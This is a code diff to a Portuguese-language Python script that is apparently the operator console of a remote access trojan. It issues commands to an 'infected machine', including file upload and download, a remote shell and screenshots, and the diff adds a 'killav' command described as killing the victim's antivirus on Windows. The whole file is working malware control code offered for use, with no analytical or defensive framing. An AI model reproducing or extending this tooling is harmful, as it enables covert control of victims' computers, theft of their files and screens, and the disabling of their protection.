@@ -51,8 +51,11 @@ def ajuda():
     print('{0}Comandos{1}:\n{2}upload{3} - Escolha um arquivo para fazer upload na maquina infectada.').format(YELLOW, END, RED, END)
     print('{0}shell{1} - Para obter uma shell na maquina do cliente.').format(RED, END)
     print('{0}download{1} - Faz o download de um arquivo na maquina infectada para sua maquina.').format(RED, END)
-    print('{0}exit{1} - Sai do programa.').format(RED, END)
+    print('{0}screenshot{1} - tira um screenshot da tela do infectado e salva no seu desktop.').format(RED, END)
+    print('{0}download{1} - Faz o download de um arquivo na maquina infectada para sua maquina.').format(RED, END)
+    print('{0}killav{1} - Mata o processo de antivirus na maquina do infectado. Apenas funciona no Windows').format(RED, END)
     print('{0}clear{1} - Limpa a tela.').format(RED, END)
+    print('{0}exit{1} - Sai do programa.').format(RED, END)
 
 def upload(s, caminho_arquivo=False):
     if(not caminho_arquivo):
@@ -82,8 +85,7 @@ def upload(s, caminho_arquivo=False):
     else:
         pass
 
-def download(s):
-    s.send('3')
+def download(s, path):
     caminho = os.path.expanduser('~')+'/Desktop/'
     caminho2 = os.path.expanduser('~')+'/Área\ de\ Trabalho/'
     if(os.path.isdir(caminho)):
@@ -91,7 +93,18 @@ def download(s):
     elif(os.path.isdir(caminho2)):
         caminho_correto = caminho2
 
-    arquivo = raw_input('Nome do arquivo: ')
+    if(len(path.split(' ')) == 1):
+        try:
+            arquivo = raw_input('Nome do arquivo: ')
+        except KeyboardInterrupt:
+            return
+    else:
+        arquivo = path.split(' ')
+        arquivo.remove('download')
+        arquivo = ' '.join(arquivo)
+
+
+    s.send('3')
     s.send(arquivo)
     existe = s.recv(1024)
     if(existe.split('+/-')[0]=='True'):
@@ -124,6 +137,8 @@ def screenshot(s):
     else:
         raise socket.error
 
+def killav(s):
+    s.send('4')
 
 def shell(s):
     s.send('2') # shell
@@ -142,30 +157,28 @@ def shell(s):
         except KeyboardInterrupt:
             break
 
-def identificador(comando, s):
-    comando = comando.split(' ')
+def identificador(comand, s):
+    comando = comand.split(' ')
     tam = len(comando)
-    if(tam>1):
-        print('{0}Comando errado ou não existe, digite {1}HELP{2} para obter ajuda dos comandos').format(END, RED, END)
-        return
+    if(comando[0] == 'upload'):
+        upload(s)
+    elif(comando[0] == 'shell'):
+        shell(s)
+    elif(comando[0] == 'download'):
+        download(s, comand)
+    elif(comando[0] == 'screenshot'):
+        screenshot(s)
+    elif(comando[0]=='killav'):
+        killav(s)
+    elif(comando[0] == 'help' or comando[0] == 'ajuda'):
+        ajuda()
+    elif(comando[0] == 'clear'):
+        os.system('clear')
+    elif(comando[0] == 'exit'):
+        sys.exit('Você escolheu sair')
     else:
-        if(comando[0] == 'upload'):
-            upload(s)
-        elif(comando[0] == 'shell'):
-            shell(s)
-        elif(comando[0] == 'download'):
-            download(s)
-        elif(comando[0] == 'screenshot'):
-            screenshot(s)
-        elif(comando[0] == 'help' or comando[0] == 'ajuda'):
-            ajuda()
-        elif(comando[0] == 'clear'):
-            os.system('clear')
-        elif(comando[0] == 'exit'):
-            sys.exit('Você escolheu sair')
-        else:
-            print('{0}Comando errado, digite {1}HELP{2} para obter ajuda dos comandos').format(END, RED, END)
-            return
+        print('{0}Comando errado, digite {1}HELP{2} para obter ajuda dos comandos').format(END, RED, END)
+        return
 
 def conecta(meuIP):
     enviado = False
@@ -191,13 +204,9 @@ def conecta(meuIP):
                 except KeyboardInterrupt:
                     sys.exit()
                 identificador(comando, conexao)
-            except socket.error as e:
-                if(str(e) == '[Errno 32] Broken pipe'):
-                    enviado = True
-                    break
-                else:
-                    enviado = True
-                    break
+            except socket.error as e: # socket.shutdown(socket.SHUT_WR)
+                enviado = True
+                break
 
 if __name__ == '__main__':
     conecta('')
